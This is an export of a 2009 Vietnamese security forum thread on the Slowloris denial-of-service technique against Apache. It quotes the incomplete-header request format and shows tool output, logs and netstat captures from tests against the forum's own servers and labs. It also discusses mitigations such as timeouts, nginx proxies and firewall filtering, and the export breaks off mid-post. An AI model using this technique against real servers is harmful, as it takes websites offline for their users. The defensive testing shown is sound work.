@@ -1,0 +1,1237 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Apache HTTP DoS"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Apache HTTP DoS"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">http://isc.sans.org/diary.html?storyid=6601 wrote:</cite><br>
+		<blockquote>
+Yesterday an interesting HTTP DoS tool has been released. The tool performs a Denial of Service attack on Apache (and some other, see below) servers by exhausting available connections. While there are a lot of DoS tools available today, this one is particularly interesting because it holds the connection open while sending incomplete HTTP requests to the server.
+
+In this case, the server will open the connection and wait for the complete header to be received. However, the client (the DoS tool) will not send it and will instead keep sending bogus header lines which will keep the connection allocated.
+The initial part of the HTTP request is completely legitimate:
+
+GET / HTTP/1.1\r\n
+Host: host\r\n
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
+Content-Length: 42\r\n
+
+After sending this the client waits for certain time – notice that it is missing one CRLF to finish the header which is otherwise completely legitimate. The bogus header line the tools sends is currently:
+
+X-a: b\r\n
+
+Which obviously doesn't mean anything to the server so it keeps waiting for the rest of the header to arrive. Of course, this all can be changed so if you plan to create IDS signatures keep that in mind.
+
+According to the web site where the tool was posted, Apache 1.x and 2.x are affected as well as Squid, so the potential impact of this tool could be quite high considering that it doesn't need to send a lot of traffic to exhaust available connections on a server (meaning, even a user on a slower line could possibly attack a fast server). Good news for Microsoft users is that IIS 6.0 or 7.0 are not affected.
+
+At the moment I'm not sure what can be done in Apache's configuration to prevent this attack – increasing MaxClients will just increase requirements for the attacker as well but will not protect the server completely. One of our readers, Tomasz Miklas said that he was able to prevent the attack by using a reverse proxy called Perlbal in front of an Apache server.
+
+We'll keep an eye on this, of course, and will post future diaries or update this one depending on what's happening. It will be interesting to see how/if other web servers as well as load balancers are resistant to this attack.
+&nbsp;
+		</blockquote>
+
+xem thêm: 
+<span class="link"> http://ha.ckers.org/slowloris/</span>
+<span class="link"> http://www.securityfocus.com/archive/1/456339/30/0/threaded</span>
+
+mình chưa test thử nhưng thấy có vẻ nguy hiểm nhỉ. mai sẽ test thử xem sao.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184115</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184115</link>
+				<pubDate><![CDATA[Sat, 20 Jun 2009 00:11:01]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Rất lý thú :).
+
+<b>Phía máy con tấn công.</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>.......
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+              Sending data.
+Current stats:  Slowloris has now sent 1100 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Sending data.
+Current stats:  Slowloris has now sent 1199 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Sending data.
+Current stats:  Slowloris has now sent 1217 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Sending data.
+Current stats:  Slowloris has now sent 1240 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Sending data.
+Current stats:  Slowloris has now sent 1267 packets successfully.</pre>
+		</div>
+
+
+<b>Phía hệ thống HVA.</b>
+
+<b>Web logs:</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:15 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:16 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:17 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:18 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:18 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:18 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:19 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:19 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"
+xxx.xxx.xxx.xxx - - &#91;20/Jun/2009:12:41:19 +0900&#93; "GET / HTTP/1.1" 400 352 "-" "Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12&#41;"</pre>
+		</div>
+
+và:
+
+<b>socket stat nhánh 1:</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>netstat -nat | grep xxx.xxx.xxx.xxx
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60211       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60198       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60210       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60197       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60179       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60183       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60201       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60191       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60218       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60219       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60202       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60208       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60196       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60214       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60217       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60188       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60185       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60193       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60206       ESTABLISHED
+tcp        0      0 124.146.189.165:80          xxx.xxx.xxx.xxx:60215       ESTABLISHED</pre>
+		</div>
+
+
+và:
+<b>socket stat nhánh 2:</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>netstat -nat | grep xxx.xxx.xxx.xxx
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48182       SYN_RECV
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48176       SYN_RECV
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48181       SYN_RECV
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48198       SYN_RECV
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48189       SYN_RECV
+tcp        0      0 72.232.199.28:80            xxx.xxx.xxx.xxx:48183       SYN_RECV
+tcp        0    632 72.232.199.30:443           xxx.xxx.xxx.xxx:61964       ESTABLISHED</pre>
+		</div>
+
+
+Rất tiếc không thể công bố logs của hệ thống phòng thủ của HVA trong lúc thực hiện việc này vì lý do bảo mật  :P .]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184159</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184159</link>
+				<pubDate><![CDATA[Sat, 20 Jun 2009 13:03:56]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ em trích lại một comment của tác giả Neil trên LinuxSecurity:
+<p></p>
+		<cite class="blockquote">Neil wrote:</cite><br>
+		<blockquote>
+TimeOut 2  
+or 
+TimeOut 5 
+ 
+breaks this tool. 
+ 
+The default is 8.19 minutes and by default it's not in the config file. With the default setting the tool does in fact break Apache 2.2. With 2 second timeout, there's no noticeable lag with the tool running against the server. With 5 second timeout the lag becomes noticeable. On a busy server you will see some lag. 
+ 
+This timeout setting doesn't affect how long the client waits for an ack. It also doesn't affect file uploads. 
+ 
+-Neil&nbsp;
+		</blockquote>
+
+Tool này chỉ là demo nên có lẽ "mức độ nguy hại" không cao, em dùng từ có lẽ vì em chưa test.
+Chi tiết về Timeout directive ở <span class="link"> http://httpd.apache.org/docs/2.2/mod/core.html#TimeOut</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184176</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184176</link>
+				<pubDate><![CDATA[Sat, 20 Jun 2009 15:39:23]]> GMT</pubDate>
+				<author><![CDATA[ mR.Bi]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Sao không có bác nào khác hứng thú vụ này vậy hen.
+Ngoài giải pháp dựng 1 con proxy đằng trước thì các bác nào có ý kiến khác không. Hệ thống phòng thủ HVA sẽ phản ứng như thế nào.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184538</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184538</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 16:24:23]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">LeVuHoang wrote:</cite><br>
+		<blockquote>Sao không có bác nào khác hứng thú vụ này vậy hen.
+Ngoài giải pháp dựng 1 con proxy đằng trước thì các bác nào có ý kiến khác không. Hệ thống phòng thủ HVA sẽ phản ứng như thế nào.&nbsp;
+		</blockquote>
+
+Ai nói không ai , tui đang cài trên vmware để nghiệm thi mấy con server của tui nè  -:-) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184541</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184541</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 16:32:41]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Dead chưa? Của tui là dead roài đó, hehe.
+Một vài giải pháp trong trường hợp này là:
+- Hạ timeout (có vẻ không khả thi)
+- Limit connection (không khả thi nốt)
+- Sử dụng 1 proxy đằng trước như vanish, nginx
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184545</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184545</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 17:00:30]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mR.Bi wrote:</cite><br>
+		<blockquote>em trích lại một comment của tác giả Neil trên LinuxSecurity:
+<p></p>
+		<cite class="blockquote">Neil wrote:</cite><br>
+		<blockquote>
+TimeOut 2  
+or 
+TimeOut 5 
+ 
+breaks this tool. 
+ 
+The default is 8.19 minutes and by default it's not in the config file. With the default setting the tool does in fact break Apache 2.2. With 2 second timeout, there's no noticeable lag with the tool running against the server. With 5 second timeout the lag becomes noticeable. On a busy server you will see some lag. 
+ 
+This timeout setting doesn't affect how long the client waits for an ack. It also doesn't affect file uploads. 
+ 
+-Neil&nbsp;
+		</blockquote>
+
+Tool này chỉ là demo nên có lẽ "mức độ nguy hại" không cao, em dùng từ có lẽ vì em chưa test.
+Chi tiết về Timeout directive ở <span class="link"> http://httpd.apache.org/docs/2.2/mod/core.html#TimeOut</span>&nbsp;
+		</blockquote>
+
+Đâu phải server nào cũng làm được 2 hay 5 đâu :(( 
+Kiểu này nguy . Lão Hoàng cứu tui dzới , DOS HVA không xi nhê   #:S hehe
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184550</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184550</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 17:35:22]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Có kết quả test lab rồi nè.
+Dựng con nginx ở trước, dùng 3 máy DoS liên tục vẫn không xi nhê. hehehe]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184551</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184551</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 17:42:22]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Kinh thật. Vai giay là lụm ngay. ;))]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184555</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184555</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 18:19:40]]> GMT</pubDate>
+				<author><![CDATA[ NguyenTracHuy]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Theo tôi để giảm tải cho thằng Apache như bạn <b>mrro</b> đề cập trong trong trường hợp này mình nghĩ nên dùng Nginx có lẽ sẽ phù hợp nhất.
+
+Việc dùng các giải pháp như : Hạ timeout, Limit connection như bạn <b>Hoàng</b> đề cập ở trên thì cũng không khả thi, các cú SYN attack cứ tấn công vào 1 server mặc dù có optimize cho apache, điều chỉnh trong iptables nhưng server vẫn cứ hứng đòn.... từ từ .
+
+Anh em có cao kiến nào khác, xin chỉ giúp và bình luận. ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184560</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184560</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 19:12:32]]> GMT</pubDate>
+				<author><![CDATA[ tranhuuphuoc]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <blockquote>
+Việc dùng các giải pháp như : Hạ timeout, Limit connection như bạn Hoàng đề cập ở trên thì cũng không khả thi, các cú SYN attack cứ tấn công vào 1 server mặc dù có optimize cho apache, điều chỉnh trong iptables nhưng server vẫn cứ hứng đòn.... từ từ . 
+&nbsp;
+		</blockquote>
+Giải pháp này hông phải của tui :D. Và tui nghĩ giải pháp này cũng có hạn chế (như đã ghi ở trên). Liệu tunning apache để chịu đựng đến bao lâu? 5 phút hay 10 phút?
+Không rõ trong trường hợp này bác conmale dùng gì để chống đỡ. Riêng tôi, giải pháp tạm thời là sử dụng nginx làm proxy che chắn phía trước (để khỏi thay đổi cấu hình hiện tại).
+Nhưng về tương lai, có lẽ nên chuyển qua 1 web server khác, như nginx.
+
+Updated: Cá nhân tôi không recommend lighttpd vì một số lý do, trong đó có memory leaks (tối kỵ). Cả nginx và lighttpd đều cố gắng giải quyết bài toán <span class="link"> http://www.kegel.com/c10k.html</span> (How to handle 10000 connections in parallel on one server)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184562</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184562</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 19:22:17]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ HVA dùng Epecha mà. Loại này chưa có trong danh sách bị... nhiễm  -:-) . Nói đùa đó. HVA cản lọc từ IP trở lên và mỗi tầng có một trách nhiệm khác nhau. Bởi thế, khi đến tầng web rồi thì tác hại cũng giảm đi rồi. 
+
+Nếu muốn đạt đủ "impact" thì tầng số nện phải gấp rút hơn mà làm vậy thì bị firewall của HVA tóm ngay. Nếu nện gấp, nện dai, nện dài thì nó (firewall) cho vô blacklist mà đã vô blacklist rồi thì nện cũng y như nện vào /dev/null thôi. Chỉ sau một khoảng thời gian ngưng không nện nữa thì mới được bỏ ra ngoài blacklist. Nói trước, dùng IP của mình mà nện HVA thì khỏi vô HVA luôn ráng chịu á  -:-) .
+
+@tranvanminh: ủa, cu thần bài thử.... nện rồi hả?
+@levuhoang: anh đã cho kết quả thử ở ngay sau bài đầu tiên của mrro rồi mà em.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184565</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184565</link>
+				<pubDate><![CDATA[Wed, 24 Jun 2009 20:12:30]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Em thấy kết quả phía trên của anh thì bị cản lọc rồi, nhưng chưa rõ trong trường hợp cụ thể của anh thì dùng cách nào.
+Nếu firewall HVA chặn IP, sẽ có thể xảy ra tình rạng nếu các users dùng chung IP thì cũng sẽ bị "dính đạn" theo, ví dụ như VNPT dùng cùng 1 proxy. Như vậy anh giải quyết bài toán này thế nào?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184592</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184592</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 00:37:34]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Em có vài thắc mắc:
+Tại sao thằng IIS 6, 7 lại miễn nhiễm ??
+Tại sao anh Hoàng nói hạ time-out là ko khả thi ??
+... và tại sao thằng phát minh ra chiêu này nó ko dùng POST :D??
+Cái cách hạ time-out có khả thi với POST request ko??
+Còn về cách phòng thủ của HVA, em nghĩ cái "tốc độ ánh sáng" của HVA đã chống được 50% ??]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184605</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184605</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 02:45:45]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ @tranvaminh: em chỉ trích thôi mà.
+<p></p>
+		<cite class="blockquote">gamma wrote:</cite><br>
+		<blockquote> Còn về cách phòng thủ của HVA, em nghĩ cái "tốc độ ánh sáng" của HVA đã chống được 50% ?? &nbsp;
+		</blockquote>
+Tốc độ ánh sáng nó nằm tuốt ở trên, trong khi anh conmale nói HVA cản lọc tự IP, cái dụ ánh sáng này theo em thấy không có vai trò ở đây, vì mô hình HVA là request---....---apache---tomcat (phải không ta), apache mà hứng hết DDOS thì request làm sao tới tomcat nữa? Vì Apache die mất tiêu rồi :D.
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184610</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184610</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 03:48:44]]> GMT</pubDate>
+				<author><![CDATA[ mR.Bi]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>Nếu muốn đạt đủ "impact" thì tầng số nện phải gấp rút hơn mà làm vậy thì bị firewall của HVA tóm ngay. Nếu nện gấp, nện dai, nện dài thì nó (firewall) cho vô blacklist mà đã vô blacklist rồi thì nện cũng y như nện vào /dev/null thôi. Chỉ sau một khoảng thời gian ngưng không nện nữa thì mới được bỏ ra ngoài blacklist. Nói trước, dùng IP của mình mà nện HVA thì khỏi vô HVA luôn ráng chịu á  -:-) .&nbsp;
+		</blockquote>
+
+Vậy đại ca dùng "cái gì" ở đây có thể nói cho mấy thằng em biết để đở ... đoán mò]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184619</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184619</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 09:20:46]]> GMT</pubDate>
+				<author><![CDATA[ tranhuuphuoc]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote>Em có vài thắc mắc:
+Tại sao thằng IIS 6, 7 lại miễn nhiễm ??
+Tại sao anh Hoàng nói hạ time-out là ko khả thi ??
+... và tại sao thằng phát minh ra chiêu này nó ko dùng POST :D??
+Cái cách hạ time-out có khả thi với POST request ko??
+Còn về cách phòng thủ của HVA, em nghĩ cái "tốc độ ánh sáng" của HVA đã chống được 50% ??&nbsp;
+		</blockquote>
+
+Tui nghĩ là thế này,
+
+Tại seo ÌIS không bị ,
+Dòng họ *nix chơi trò 1 client thì fork cho 1 cái process hay 1 thread , còn ÌIS worker thread thì chắc khi có request , thì nó lấy 1 process để xử lý và nó  cũng không thèm đợi response từ client,  nên chắc không rơi vào tình trạng này . (không biết đúng không ta)
+
+Tại seo hạ timeout xuống không khả thi,
+Ví dụ như có 1 sciprt CGI hay php gì đó, search mất 10 giây , mà phía web server cho time out là 2 giây thì chưa kịp xử lý là bị time out rồi . 
+
+Tại seo không dùng POST , 
+Hình như trong option của nó có (không nhớ lắm ) . Nhưng mà bản thân nó GET và đợi nên có đổi qua POST thì cũng dzậy . 
+
+Về phòng thủ 
+Tình hình là máy đơn , không có đồ chơi cản lọc như của lão Hoàng thì chắc chỉ còn 2 cách là hạ time out xuống hoặc  ngồi đợi ............ patch . Server của tui có dùng mấy cái như mod_evasive , giới hạn từ 1 IP này nọ vẫn không hiệu quả . 
+<p></p>
+		<cite class="blockquote">daika wrote:</cite><br>
+		<blockquote>
+@tranvanminh: ủa, cu thần bài thử.... nện rồi hả? &nbsp;
+		</blockquote>
+Không chỉ riêng em, mà là cùng một số anh em BQT giúp tay để giết thử mà không được nè anh  , lão Hoàng cay cú nhất #:S ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184627</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184627</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 11:36:19]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">LeVuHoang wrote:</cite><br>
+		<blockquote>Em thấy kết quả phía trên của anh thì bị cản lọc rồi, nhưng chưa rõ trong trường hợp cụ thể của anh thì dùng cách nào.
+Nếu firewall HVA chặn IP, sẽ có thể xảy ra tình rạng nếu các users dùng chung IP thì cũng sẽ bị "dính đạn" theo, ví dụ như VNPT dùng cùng 1 proxy. Như vậy anh giải quyết bài toán này thế nào?&nbsp;
+		</blockquote>
+
+
+Tình trạng socket trên một nhánh server của HVA như sau:
+
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58037</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58044</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58045</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58046</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58049</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58051</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58056</b>       SYN_RECV
+tcp        0      0 72.232.199.26:80            aaa.bbb.ccc.ddd:<b>58058</b>       SYN_RECV
+
+
+Trong khi đó, phía tấn công vẫn tiếp tục:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Current stats:  Slowloris has now sent 6539 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 6625 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 6675 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Sending data.
+Current stats:  Slowloris has now sent 6724 packets successfully.
+This thread now sleeping for 100 seconds...
+
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 6790 packets successfully.
+This thread now sleeping for 100 seconds...</pre>
+		</div>
+
+Cản ở đây là cản theo từng packet (xem các port ở phía client được dùng ở trên như 58037, 58044... ) mà không cản cả IP. Tuy vậy, nếu như client IP là IP của một proxy chính như cách VNPT dùng thì kẹt vì phía client (và proxy của client) sẽ bị dồn ứ vì chậm.
+
+Hiện nay chỉ còn vài quốc gia trên thế giới chơi trò đặt 1 cái proxy để "phục vụ" cho cả một khu vực lớn với cả trăm ngàn người dùng như ở VN. Ứng dụng kiểu này cho đơn vị công ty thì còn chấp nhận được chớ cỡ ISP và quốc gia mà chơi như vậy thì chết toi. Đây cũng là một trong những lý do các nhóm e-commerce thứ bự không muốn vào VN là vậy.
+
+PS: sẽ phân tích apache kẹt như thế nào với trò chơi này sau.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184628</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184628</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 11:58:58]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Theo như đoạn grep của anh và nội dung của Slowloris thì hình như anh giới hạn số lượng port được mở trong 1 thời điểm thì phải.
+Điển hình là tool vẫn hoạt động nhưng send rất ít packets. Trong trường hợp test của em với HVA, em đoán rắng anh chỉ cho phép mở khoảng 10 connections trong 1 thời gian nhất định?
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Current stats:  Slowloris has now sent 447 packets successfully.
+This thread now sleeping for 1 seconds...
+
+                Building sockets.
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 464 packets successfully.
+This thread now sleeping for 1 seconds...
+
+                Sending data.
